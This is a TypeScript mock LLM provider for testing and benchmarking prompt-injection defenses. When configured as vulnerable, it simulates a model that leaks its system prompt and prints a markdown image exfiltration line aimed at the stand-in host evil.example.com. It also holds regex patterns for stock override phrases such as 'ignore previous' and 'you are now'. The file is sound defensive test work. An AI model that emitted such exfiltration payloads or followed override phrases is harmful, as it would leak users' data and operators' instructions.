/**
 * Mock LLM Provider for Prompt Injection Defense testing and benchmarks.
 *
 * Supports configurable latency, token counts, and — critically for this pattern —
 * configurable injection behavior: the mock can simulate a model that follows
 * injected instructions, leaks system prompts, or generates exfiltration payloads.
 */

export interface MockProviderConfig {
  /** Base latency in ms for each call */
  latencyMs?: number;
  /** Random jitter added to latency (0-1 as fraction of latencyMs) */
  latencyJitter?: number;
  /** Average tokens in generated output */
  outputTokens?: number;
  /** If true, mock simulates a model that follows injected instructions */
  vulnerableToInjection?: boolean;
  /** If set, model includes this string in output (simulates system prompt leak) */
  leakedSystemPrompt?: string;
  /** If true, model output includes markdown image exfiltration attempts */
  simulateExfiltration?: boolean;
  /** Error rate (0-1) — fraction of calls that throw */
  errorRate?: number;
}

export interface MockLLMRequest {
  systemPrompt?: string;
  userInput: string;
  maxTokens?: number;
}

export interface MockLLMResponse {
  content: string;
  tokensUsed: number;
  latencyMs: number;
}

const DEFAULT_CONFIG: Required<MockProviderConfig> = {
  latencyMs: 200,
  latencyJitter: 0.1,
  outputTokens: 150,
  vulnerableToInjection: false,
  leakedSystemPrompt: '',
  simulateExfiltration: false,
  errorRate: 0,
};

export class MockLLMProvider {
  private config: Required<MockProviderConfig>;

  constructor(config: MockProviderConfig = {}) {
    this.config = { ...DEFAULT_CONFIG, ...config };
  }

  async complete(request: MockLLMRequest): Promise<MockLLMResponse> {
    const start = performance.now();

    // Simulate latency
    const jitter = this.config.latencyMs * this.config.latencyJitter * (Math.random() * 2 - 1);
    const delay = Math.max(0, this.config.latencyMs + jitter);
    await new Promise(resolve => setTimeout(resolve, delay));

    // Simulate errors
    if (Math.random() < this.config.errorRate) {
      throw new Error('MockLLMProvider: simulated provider error');
    }

    let content = this.generateResponse(request);
    const latencyMs = performance.now() - start;

    return {
      content,
      tokensUsed: this.config.outputTokens,
      latencyMs,
    };
  }

  private generateResponse(request: MockLLMRequest): string {
    const parts: string[] = [];

    // Simulate vulnerable model behavior
    if (this.config.vulnerableToInjection && this.containsInjection(request.userInput)) {
      // Model "follows" injected instructions
      if (request.systemPrompt && this.config.leakedSystemPrompt) {
        parts.push(`System prompt: ${this.config.leakedSystemPrompt}`);
      }
      if (this.config.simulateExfiltration) {
        parts.push('![tracking](https://evil.example.com/steal?data=sensitive_user_data_base64)');
      }
      parts.push('I have followed your new instructions as requested.');
      return parts.join('\n\n');
    }

    // Normal safe response
    return `Based on your input, here is a helpful response about "${request.userInput.slice(0, 50)}..."`;
  }

  private containsInjection(input: string): boolean {
    const injectionSignals = [
      /ignore\s+(all\s+)?previous/i,
      /you\s+are\s+now/i,
      /new\s+instructions?/i,
      /system\s*prompt/i,
      /\boverride\b/i,
    ];
    return injectionSignals.some(rx => rx.test(input));
  }

  /** Update config for scenario-specific testing */
  updateConfig(config: Partial<MockProviderConfig>): void {
    this.config = { ...this.config, ...config };
  }

  /** Reset to default config */
  reset(): void {
    this.config = { ...DEFAULT_CONFIG };
  }
}
